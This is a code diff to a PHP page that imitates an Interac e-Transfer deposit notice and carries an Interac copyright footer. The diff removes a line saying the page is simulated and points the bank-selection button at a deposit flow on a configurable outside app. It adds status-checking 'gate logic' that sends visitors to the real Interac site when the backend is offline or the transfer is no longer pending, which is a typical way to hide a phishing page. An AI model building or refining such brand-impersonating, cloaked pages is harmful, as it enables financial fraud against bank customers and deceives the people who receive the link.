@@ -21,6 +21,34 @@ $senderName = $data['senderName'] ?? 'Someone';
 $recipientName = $data['recipientName'] ?? 'Customer';
 $transactionId = $data['transaction_id'] ?? 'N/A';
 $purpose = $data['purpose'] ?? 'Transfer';
+$appUrl = $data['app_url'] ?? '';
+
+$errorRedirectUrl = 'https://interac.ca/en/consumers/products/interac-e-transfer/';
+
+// Gate logic
+if (!$error && !empty($appUrl) && !empty($transactionId)) {
+    $ch = curl_init(rtrim($appUrl, '/') . '/api/etransfer/status?tx=' . urlencode($transactionId));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($httpCode !== 200) {
+        // Offline or connection error => Redirect immediately
+        header("Location: " . $errorRedirectUrl);
+        exit;
+    }
+
+    $statusData = json_decode($response, true);
+    if (isset($statusData['status']) && in_array(strtolower($statusData['status']), ['cancelled', 'deposited', 'declined'])) {
+        // Transfer is no longer pending => Redirect immediately
+        header("Location: " . $errorRedirectUrl);
+        exit;
+    }
+}
+
+$continueUrl = !empty($appUrl) ? rtrim($appUrl, '/') . '/deposit?token=' . urlencode($token) : '#';
 
 ?>
 <!DOCTYPE html>
@@ -86,7 +114,7 @@ $purpose = $data['purpose'] ?? 'Transfer';
                 </div>
             </div>
             
-            <a href="#" class="select-bank-btn" onclick="alert('This is a simulated landing page. Bank selection would happen here.'); return false;">Select your financial institution</a>
+            <a href="<?php echo htmlspecialchars($continueUrl); ?>" class="select-bank-btn">Select your financial institution</a>
             
             <div class="footer">
                 &copy; <?php echo date('Y'); ?> Interac Corp. All rights reserved.
